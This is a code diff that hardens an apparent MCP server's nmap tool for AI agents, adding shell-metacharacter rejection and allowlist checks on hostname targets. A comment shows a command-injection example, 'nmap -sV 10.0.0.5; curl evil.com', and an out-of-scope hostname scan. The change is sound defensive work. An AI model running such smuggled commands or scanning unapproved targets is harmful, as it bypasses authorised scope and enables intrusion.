@@ -47,12 +47,14 @@ from tools.api_key_store import (
     research_api_keys_available,
 )
 from tools.cve_lookup import format_cve_results
+from tools.kernel.allowlist import _extract_scanner_targets
 from tools.mcp_shared import build_cve_search, build_researcher, load_config, run_mcp_http_server
 from tools.validation_utils import (
     is_target_in_allowlist,
     preflight_command_check,
     sanitize_target_in_command,
     validate_ipv4,
+    validate_target_or_ip,
 )
 
 # ── Scope helpers ───────────────────────────────────────────────────
@@ -285,7 +287,7 @@ def create_mcp_server(
         nmap -sC, nmap -O, nmap --script, nmap -A, and the -sS/-sT
         forms. Shell metacharacters are rejected outright.
         """
-        decision = preflight_command_check(command)
+        decision = preflight_command_check(command, reject_shell_metachars=True)
         if not decision.get("valid", False):
             return {"ok": False, "error": decision.get("blocked_reason", "rejected")}
         # Whitelist of approved nmap command shapes
@@ -301,10 +303,26 @@ def create_mcp_server(
         ]
         if not any(re.match(p, command.strip()) for p in nmap_patterns):
             return {"ok": False, "error": f"command shape {command!r} not in allowlist"}
+        # Shell metacharacters are never legitimate in a single nmap invocation;
+        # reject up front so `nmap -sV 10.0.0.5; curl evil.com` cannot smuggle a
+        # second command past the shape check above.
+        if re.search(r"[;|&$`]", command):
+            return {"ok": False, "error": "shell metacharacters are not allowed"}
         # Every IP/CIDR argument must be in scope
         sanitized, _corrections = sanitize_target_in_command(command)
         for token in re.findall(r"\b\d{1,3}(?:\.\d{1,3}){3}(?:/\d{1,2})?\b", command):
             if not _is_in_allowlist(token, allowlist):
+                return {"ok": False, "error": f"target {token!r} in command is not in scope"}
+        # Hostname targets (e.g. `nmap -sV evil.com`) bypassed the IPv4-only
+        # regex above entirely. Extract scanner-verb targets (hosts, CIDRs)
+        # and gate each through syntax validation + the allowlist.
+        for token in _extract_scanner_targets(command):
+            try:
+                ipaddress.ip_network(token, strict=False)
+                in_scope = _is_in_allowlist(token, allowlist)
+            except ValueError:
+                in_scope = validate_target_or_ip(token) and _is_in_allowlist(token, allowlist)
+            if not in_scope:
                 return {"ok": False, "error": f"target {token!r} in command is not in scope"}
         return await _run_nmap(sanitized.split()[1:], timeout=default_timeout)
 
